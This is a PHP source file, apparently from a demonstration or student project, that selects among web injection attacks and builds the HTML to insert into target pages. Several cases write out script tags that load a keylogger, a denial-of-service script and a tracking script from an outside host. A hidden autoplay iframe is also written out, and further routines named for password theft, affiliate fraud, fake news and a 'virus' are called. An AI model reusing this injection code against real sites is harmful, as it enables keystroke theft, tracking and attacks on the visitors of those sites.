<?php
session_start();
require_once "../php/BaseController.php";
//$typeOfAttack = (string)$_SESSION['Type'];
//$privateKey = $_SESSION['privateKey'];
$textToInsert="";

//Selecting which function to run according to which attack is selected
function launchAttack($typeOfAttack,$conn,$key){
    

switch($typeOfAttack){
    case "Key":
          $keyloggerscript = "http://stme.esy.es/js/keylogger.js";
          $textToInsert="<script type='text/javascript' src='$keyloggerscript'</script>";
          runScript($textToInsert ,$conn,$key,"html");
          break;
    case "Dos":
          $link = "http://stme.esy.es/".$key;
          $DosScript = "http://stme.esy.es/js/dos.js";
          $textToInsert="<script type='text/javascript' src='$DosScript'></script>";
          //for($i=0;$i<10;i++){$textToInsert .= $textToInsert};
          runDosScript($textToInsert,$conn,$key);
          break;
        
    case "RickRoll":
          $textToInsert="<iframe width='0' height='0' src='https://www.youtube.com/embed/oHg5SJYRHA0?rel=0&autoplay=1' frameborder='0'></iframe>";
          runScript($textToInsert,$conn,$key,"html");
          break;

//    case "Cryptography":
//          runCryptographyScript($privateKey,$key);
//          break;

    case "Tracking":
          $TrackingScript = "http://stme.esy.es/js/tracking.js";
          $textToInsert="<script type='text/javascript' src='$TrackingScript'></script>";
          runScript($textToInsert,$conn,$key,"html");
          break;
    case "Password":
          runPasswordScript($key);
          break;
        
    case "Affliate":
        runAffliateScript($conn,$key);
        break;
        
    case "Fake News":
        runBbcScript($conn,$key);
        break;
        
    case "Virus":
        runVirusScript($conn,$key);
        break;

    default:  
        runIframeScript($conn,$key);
        break;
    }

}
?>
